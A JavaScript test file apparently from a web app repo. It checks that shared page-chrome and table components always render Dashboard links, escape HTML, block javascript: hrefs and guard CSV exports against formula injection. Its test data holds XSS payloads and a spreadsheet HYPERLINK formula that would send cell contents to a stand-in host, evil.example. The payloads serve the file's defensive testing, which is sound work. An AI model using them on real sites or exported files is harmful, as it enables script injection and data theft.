#!/usr/bin/env node
/* The shared chrome and the shared table — js/ui-chrome.js + js/ui-table.js.
 *
 * These two files are the first components in this repo that BUILD MARKUP FOR
 * EVERY PAGE. A mistake in either is not one page's bug, it is twenty-eight
 * pages' bug, so the things worth pinning here are:
 *
 *   1  the structural promise. Four pages shipped with no Dashboard link
 *      because the link set was retyped per page. `navLinks()` composes it
 *      instead, so the assertion below is not "today/ has a Dashboard link" —
 *      it is "NO page can lack one", checked against every id in the registry.
 *   2  escaping. Both files interpolate into HTML; a hostile label, a hostile
 *      class name and a `javascript:` href are each driven through here.
 *   3  the three register warts this move fixed. Each is asserted against the
 *      rendered markup, which is why Register.html() is a pure string method.
 *   4  the CSV formula guard, which had to survive the move byte-for-byte.
 *
 * Run: node scripts/test_ui_chrome.mjs
 */
import { readFileSync } from 'fs';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';

/* Attribute names in REAL tag positions only — never inside escaped text.
   Three of this suite's original assertions used bare substring matching and
   all three were false alarms: they fired on the component's own logo tag and
   on payloads sitting inertly inside `&quot;&gt;&lt;img …&gt;`. An injected
   handler has to become an actual attribute to do anything, so that is what
   gets measured. */
function attrNames(html) {
  const out = [];
  const tag = /<[a-z][a-z0-9-]*\s([^>]*)>/gi;
  let m;
  while ((m = tag.exec(String(html))) !== null) {
    /* The value must be CONSUMED, not skipped over. A first attempt matched
       `name=` anywhere inside the tag and so read `title="…onerror=alert(1)…"`
       — an escaped payload sitting inertly in a value — as an attribute called
       onerror, reporting a breach that does not exist. Same false-positive
       shape as the substring tests this helper replaced. */
    const re = /([a-z_:][\w:.-]*)\s*=\s*("[^"]*"|'[^']*'|[^\s>]*)/gi;
    let a;
    while ((a = re.exec(m[1])) !== null) out.push(a[1]);
  }
  return out;
}


const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));

/* A localStorage stand-in, so the register can load and persist exactly as it
   does in a browser. Set before the modules are evaluated because Register's
   constructor reads the store on the way in. */
const store = new Map();
globalThis.localStorage = {
  getItem: (k) => (store.has(k) ? store.get(k) : null),
  setItem: (k, v) => { store.set(k, String(v)); },
  removeItem: (k) => { store.delete(k); },
};

for (const f of ['js/safe-url.js', 'js/ui-chrome.js', 'js/ui-table.js']) {
  (0, eval)(readFileSync(join(ROOT, f), 'utf8'));
}
const { CChrome, CTable } = globalThis;

let pass = 0, fail = 0;
const t = (name, cond, extra) => {
  if (cond) { pass++; return; }
  fail++;
  console.log('  x ' + name + (extra != null ? '\n      ' + String(extra).slice(0, 300) : ''));
};
const threw = (fn) => { try { fn(); return false; } catch (e) { return true; } };

/* ═══ 1 · the nav model is a single source of truth ═══════════════════════ */
{
  const ids = Object.keys(CChrome.NAV);
  t('the registry covers every module directory', ids.length >= 29, ids.length);
  t('every entry has an href, a label and a title',
    ids.every((id) => {
      const e = CChrome.NAV[id];
      return e && typeof e.href === 'string' && e.href.charAt(0) === '/' && e.label && e.title;
    }));
  t('every href survives CinUrl.safe unchanged',
    ids.every((id) => globalThis.CinUrl.safe(CChrome.NAV[id].href) === CChrome.NAV[id].href));

  /* THE structural promise. Not "these four pages were fixed" — every page. */
  let missingHome = [], missingHub = [];
  for (const here of ids) {
    const got = CChrome.navLinks({ here }).map((l) => l.id);
    if (here !== CChrome.HOME && got.indexOf(CChrome.HOME) < 0) missingHome.push(here);
    if (here !== CChrome.HUB && got.indexOf(CChrome.HUB) < 0) missingHub.push(here);
  }
  t('no page can be rendered without a Dashboard link', missingHome.length === 0, missingHome.join(', '));
  t('no page can be rendered without a Studio link', missingHub.length === 0, missingHub.join(', '));

  /* The four that historically had none, by name, so a regression reads
     plainly in the failure output. */
  for (const here of ['producer', 'timeline', 'tools', 'today']) {
    const hrefs = CChrome.navLinks({ here }).map((l) => l.href);
    t(here + '/ reaches the dashboard', hrefs.indexOf('/dashboard.html') === 0, hrefs.join(' '));
  }

  const links = CChrome.navLinks({ here: 'today', links: ['producer#schedule', 'dailies'] });
  t('HOME is first and HUB is last',
    links[0].id === 'dashboard' && links[links.length - 1].id === 'timeline',
    links.map((l) => l.id).join(','));
  t('a hash ref keeps its fragment', links[1].href === '/producer/#schedule', links[1].href);
  t('page links sit between HOME and HUB',
    links.map((l) => l.id).join(',') === 'dashboard,producer,dailies,timeline',
    links.map((l) => l.id).join(','));

  t('the current page is never linked to itself',
    CChrome.navLinks({ here: 'finance', links: ['finance', 'producer'] })
      .every((l) => l.id !== 'finance'));
  t('a link a page repeats is emitted once',
    CChrome.navLinks({ here: 'vfx', links: ['dashboard', 'timeline', 'props'] }).length === 3);
  t('the Studio page keeps its Dashboard link and drops its own',
    CChrome.navLinks({ here: 'timeline' }).map((l) => l.id).join(',') === 'dashboard');
  t('an unknown nav id throws rather than rendering nothing',
    threw(() => CChrome.navLinks({ here: 'vfx', links: ['moneyroom'] })));
  t('the error names the registry to fix', (() => {
    try { CChrome.navLinks({ links: ['nope'] }); return false; }
    catch (e) { return /CChrome\.NAV/.test(e.message); }
  })());
}

/* ═══ 2 · the topbar escapes everything it is handed ══════════════════════ */
{
  const XSS = '"><img src=x onerror=alert(1)>';
  const html = CChrome.topbarHtml({
    here: 'vfx',
    meta: XSS,
    metaId: 'vxMeta',
    left: [{ kind: 'button', id: 'a', label: XSS, title: XSS }],
    actions: [
      { kind: 'select', id: 'sel', options: [XSS, 'ok'], value: 'ok' },
      { kind: 'input', id: 'inp', value: XSS, placeholder: XSS },
      { kind: 'gap' },
      { kind: 'slot', name: 'legacy' },
      { kind: 'tabs', id: 'tabs', attr: 'bt', items: [{ id: 'one', label: XSS, on: true }] },
    ],
    links: ['finance'],
  });
  t('no unescaped angle bracket from a hostile value', html.indexOf('<img src=x') < 0, html.slice(0, 200));
  /* Substring matching is the wrong instrument here and gave three false
     alarms: `"><img` matches the component's OWN logo tag
     (`text-decoration:none"><img src="/assets/logo-mark.svg"`), and `onerror`
     matches the payload sitting harmlessly inside `&quot;&gt;&lt;img …&gt;`
     as escaped TEXT. What actually matters is whether a hostile value can
     become an ATTRIBUTE, so read attribute names out of real tag positions
     and require that none of them is an event handler. */
  t('no hostile value becomes an event-handler attribute',
    attrNames(html).every((n) => !/^on/i.test(n)),
    attrNames(html).filter((n) => /^on/i.test(n)).join(','));
  t('the hostile value is still present, escaped', html.indexOf('&quot;&gt;&lt;img') >= 0);
  t('the logo and the spacer are always there',
    html.indexOf('class="logo"') >= 0 && html.indexOf('tb-spacer') >= 0);
  t('meta carries the id it was given', html.indexOf('id="vxMeta"') >= 0);
  t('a tab strip renders ps-tab buttons with the schema data attribute',
    html.indexOf('class="ps-tab on"') >= 0 && html.indexOf('data-bt="one"') >= 0);
  t('a slot renders a placeholder, never page markup', html.indexOf('data-tb-slot="legacy"') >= 0);
  t('a gap is a class, not an inline width', html.indexOf('class="tb-gap"') >= 0);
  t('nav links come out as tb-btn anchors',
    (html.match(/<a class="tb-btn" href=/g) || []).length === 3, html);

  /* The CSP carries 'unsafe-inline', so an escaped javascript: href still
     runs. esc() is not enough in a URL slot and CinUrl.safe() is the check. */
  const evil = CChrome.control({ kind: 'link', href: 'javascript:alert(1)', label: 'x' });
  t('a javascript: href is blanked, not escaped', evil.indexOf('href=""') >= 0, evil);
  const tricky = CChrome.control({ kind: 'link', href: 'java\tscript:alert(1)', label: 'x' });
  t('a tab-obfuscated scheme is blanked too', tricky.indexOf('href=""') >= 0, tricky);
  const good = CChrome.control({ kind: 'link', to: 'finance' });
  t('a nav-id link takes href, label and title from the registry',
    good.indexOf('href="/finance/"') >= 0 && good.indexOf('Money Room') >= 0 &&
    good.indexOf('title="POs') >= 0, good);
  /* `ok" onclick="alert(1)` sanitises to the class token `ok onclickalert1`.
     That is SAFE — every character that could end the attribute is gone — but
     it still contains the letters "onclick", so a substring test reports a
     breach that is not there. Assert the real property instead: the class
     value contains only what a class may contain, and no handler attribute
     was created. */
  const dirty = CChrome.control({ kind: 'button', label: 'x', cls: 'ok" onclick="alert(1)' });
  t('a class name is filtered to what a class may contain',
    /class="[\w\s-]*"/.test(dirty) && attrNames(dirty).every((n) => !/^on/i.test(n)), dirty);
  const tabs = CChrome.control({ kind: 'tabs', attr: 'x" onload="y', items: [{ id: 'a', label: 'A' }] });
  t('a data-* attribute name is filtered too',
    attrNames(tabs).every((n) => /^[a-z0-9-]+$/i.test(n) && !/^on/i.test(n)), attrNames(tabs).join(','));
  t('an absent id emits no empty attribute',
    CChrome.control({ kind: 'button', label: 'A' }).indexOf('id=') < 0);
}

/* ═══ 3 · the register: CRUD, the three fixed warts, the CSV guard ════════ */
const SCHEMA_KEY = 'SB_UiTableProbe_v9';   /* a probe key, never a shipped store */
function reg(extra) {
  store.clear();
  return new CTable.Register(Object.assign({
    key: SCHEMA_KEY,
    hint: 'Rates & <notes>',
    fields: [
      { id: 'name', label: 'Name' },
      { id: 'notes', label: 'Notes', type: 'textarea' },
      { id: 'rate', label: 'Rate', type: 'money', width: '90px' },
      { id: 'days', label: 'Days', type: 'number' },
      { id: 'expiry', label: 'Expires', type: 'date' },
      { id: 'dept', label: 'Dept', type: 'select', options: ['Camera', 'Art'] },
    ],
  }, extra || {}));
}

{
  const r = reg();
  const row = r.add({ name: 'Ada', rate: '1234.56', days: '2.5', notes: 'two\nlines', dept: 'Art' });
  t('add stamps an id and stores the row', !!row.id && r.rows.length === 1, row);
  t('add persists to the store', JSON.parse(localStorage.getItem(SCHEMA_KEY)).length === 1);
  r.update(row.id, 'name', 'Ada L');
  t('update writes through', r.rows[0].name === 'Ada L' &&
    JSON.parse(localStorage.getItem(SCHEMA_KEY))[0].name === 'Ada L');
  r.remove(row.id);
  t('remove persists', r.rows.length === 0 && JSON.parse(localStorage.getItem(SCHEMA_KEY)).length === 0);
  t('a fresh register reloads what was persisted', new CTable.Register({ key: SCHEMA_KEY, fields: [] }).rows.length === 0);
}

/* WART 1 — type:'textarea' used to render a single-line <input>. */
{
  const r = reg();
  r.add({ notes: 'line one\nline two' });
  const h = r.html();
  t('textarea renders a real <textarea>', h.indexOf('<textarea') >= 0, h);
  t('its content is escaped, not an attribute',
    h.indexOf('>line one\nline two</textarea>') >= 0, h.slice(h.indexOf('<textarea'), h.indexOf('<textarea') + 120));
  t('a hostile note cannot close the element early',
    reg().constructor && (() => {
      const q = reg(); q.add({ notes: '</textarea><img src=x onerror=alert(1)>' });
      return q.html().indexOf('<img src=x') < 0;
    })());
}

/* WART 2 — type:'money' and type:'number' both fell through to type="text". */
{
  const r = reg();
  r.add({ rate: '1234.56', days: '2.5' });
  const h = r.html();
  t('money renders a number input with cents', /data-f="rate" type="number" step="0\.01"/.test(h), h);
  t('number renders a number input', /data-f="days" type="number" step="any"/.test(h), h);
  t('text still renders a text input', /data-f="name" type="text"/.test(h));
  t('date still renders a date input', /data-f="expiry" type="date"/.test(h));
  t('a numeric cell is marked for right-aligned mono', h.indexOf('class="tk-in tk-num"') >= 0);
  t('a select still renders its options',
    h.indexOf('<select class="uc-sel tk-in" data-f="dept"') >= 0);
  t('the money value survives to the input', h.indexOf('value="1234.56"') >= 0);
  t('a width becomes a column style', h.indexOf('style="width:90px"') >= 0);
}

/* WART 3 — `flags` was documented, called, and its result thrown away. */
{
  const plain = reg();
  plain.add({ name: 'a' });
  const flagged = reg({ flags: (row) => (row.name === 'a' ? { cls: 'bad', label: 'OVER' } : null) });
  flagged.add({ name: 'a' });
  const h = flagged.html();
  t('a flag draws a chip', h.indexOf('<span class="tk-chip bad">OVER</span>') >= 0, h);
  t('the header gains a column for it',
    (h.match(/<th><\/th>/g) || []).length === 2 && (plain.html().match(/<th><\/th>/g) || []).length === 1);

  const many = reg({ flags: () => [{ cls: 'warn', label: 'A' }, null, { cls: 'good', label: 'B' }] });
  many.add({ name: 'x' });
  t('a list of flags draws every chip',
    (many.html().match(/tk-chip/g) || []).length === 2, many.html());

  const empty = reg({ flags: () => null });
  t('the empty-state colspan counts the flags column',
    empty.html().indexOf('colspan="8"') >= 0 && reg().html().indexOf('colspan="7"') >= 0);

  const evil = reg({ flags: () => ({ cls: 'x" onmouseover="alert(1)', label: '<b>no</b>' }) });
  evil.add({ name: 'x' });
  const eh = evil.html();
  /* Same false-alarm shape as the class test above: the sanitised residue
     still spells "onmouseover". What matters is that it is a class token and
     not an attribute. */
  t('a flag class cannot break out of the attribute',
    attrNames(eh).every((n) => !/^on/i.test(n)) && /class="tk-chip [\w\s-]*"/.test(eh), eh);
  t('a flag label is escaped', eh.indexOf('<b>no</b>') < 0 && eh.indexOf('&lt;b&gt;') >= 0);
}

/* expiry chips — the behaviour that already worked, pinned so the flags column
   cannot displace it. */
{
  const iso = (days) => new Date(Date.now() + days * 86400000).toISOString().slice(0, 10);
  const r = reg({ expiryField: 'expiry' });
  r.add({ expiry: iso(-3) });
  r.add({ expiry: iso(10) });
  r.add({ expiry: iso(400) });
  const h = r.html();
  t('a lapsed date reads EXPIRED', h.indexOf('>EXPIRED<') >= 0, h);
  t('a date inside 30 days reads a countdown', /tk-chip warn">\d+d</.test(h), h);
  t('a distant date gets no chip', (h.match(/tk-chip/g) || []).length === 2);
}

/* the summary is a deliberate HTML producer — the one place a schema may hand
   the engine markup, and the schemas that use it escape their own values. */
{
  const r = reg({ summary: (rows) => '<b>' + rows.length + '</b> rows' });
  t('a summary is rendered as markup', r.html().indexOf('<b>0</b> rows') >= 0);
  t('a hint is escaped', reg().html().indexOf('Rates &amp; &lt;notes&gt;') >= 0);
}

/* ═══ 4 · the CSV formula guard survived the move ═════════════════════════ */
{
  const ATTACKS = ['=1+1', '+1+1', '-1+1', '@SUM(A1:A9)', '\t=1+1', '\r=1+1',
    '=HYPERLINK("http://evil.example/?x="&A1,"Click")'];
  const r = reg();
  ATTACKS.forEach((a) => r.add({ name: a, notes: a, rate: a, days: a, expiry: a, dept: a }));
  const csv = r.toCsv();
  const cells = [];
  for (const line of csv.split('\n')) {
    let cur = '', q = false;
    for (const ch of line) {
      if (ch === '"') { q = !q; cur += ch; }
      else if (ch === ',' && !q) { cells.push(cur); cur = ''; }
      else cur += ch;
    }
    cells.push(cur);
  }
  const unquoted = (c) => (c.charAt(0) === '"' ? c.slice(1, -1).replace(/""/g, '"') : c);
  const dangerous = cells.filter((c) => /^[=+\-@\t\r]/.test(unquoted(c)));
  t('no exported cell can begin a formula', dangerous.length === 0, dangerous.slice(0, 3).join(' | '));
  t('the guard adds an apostrophe rather than eating the text', csv.indexOf("'=1+1") >= 0);
  t('an embedded quote is still doubled', r.toCsv().indexOf('""http://evil.example') >= 0);
  t('a hostile header label is guarded too',
    new CTable.Register({ key: SCHEMA_KEY, fields: [{ id: 'a', label: '=cmd' }] }).toCsv()
      .indexOf('"\'=cmd"') === 0);
  t('the header row names every field',
    r.toCsv().split('\n')[0] === '"Name","Notes","Rate","Days","Expires","Dept"');
}

/* ═══ 5 · helpers, and the tools bridge that re-exports them ══════════════ */
{
  t('esc covers all five markup characters',
    CTable.esc(`&<>"'`) === '&amp;&lt;&gt;&quot;&#39;', CTable.esc(`&<>"'`));
  t('fmtMoney rounds to whole dollars', CTable.fmtMoney(1234.56) === '$1,235', CTable.fmtMoney(1234.56));
  t('num strips currency formatting', CTable.num('$1,234.56') === 1234.56, CTable.num('$1,234.56'));
  t('num is 0 for nonsense', CTable.num('n/a') === 0);
  t('today is an ISO date', /^\d{4}-\d{2}-\d{2}$/.test(CTable.today()));
  t('daysUntil is null for a blank date', CTable.daysUntil('') === null);
  t('uid values do not collide', CTable.uid() !== CTable.uid());
  t('load falls back when the store is empty', CTable.load('SB_NoSuchProbe_v9', 'fb') === 'fb');
  CTable.save('SB_NoSuchProbe_v9', { a: 1 });
  t('save round-trips', CTable.load('SB_NoSuchProbe_v9', null).a === 1);
  t('chipCls strips anything a class may not contain', CTable.chipCls('a"b<c') === 'abc');
  t('csvSafe is exported for other exporters to reuse', CTable.csvSafe('=x') === "'=x");

  /* tools/tools-core.js is now a re-export. It must still answer to the five
     tools modules that read TCore at load time. */
  (0, eval)(readFileSync(join(ROOT, 'tools/tools-core.js'), 'utf8'));
  const { TCore } = globalThis;
  t('TCore still exposes the register engine', TCore.Register === CTable.Register);
  t('TCore still exposes the escaper', TCore.esc === CTable.esc);
  t('TCore.toast is now the one shared toast', TCore.toast === CChrome.toast);
  t('TCore exposes exactly the documented surface',
    Object.keys(TCore).sort().join(',') ===
    '$,Register,csvSafe,daysUntil,esc,fmtMoney,load,num,save,toast,today,uid',
    Object.keys(TCore).sort().join(','));
  t('there is only one implementation left',
    !/function\s+csvSafe/.test(readFileSync(join(ROOT, 'tools/tools-core.js'), 'utf8')));
}


/* toastEl resolves the toast host. In node there is no document at all, and
   it must answer null rather than throwing — the same "works headless" rule
   every lib in this repo follows, and what lets this suite run at all. */
{
  t('toastEl answers null with no document', CChrome.toastEl() === null);
}

console.log(`test_ui_chrome: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
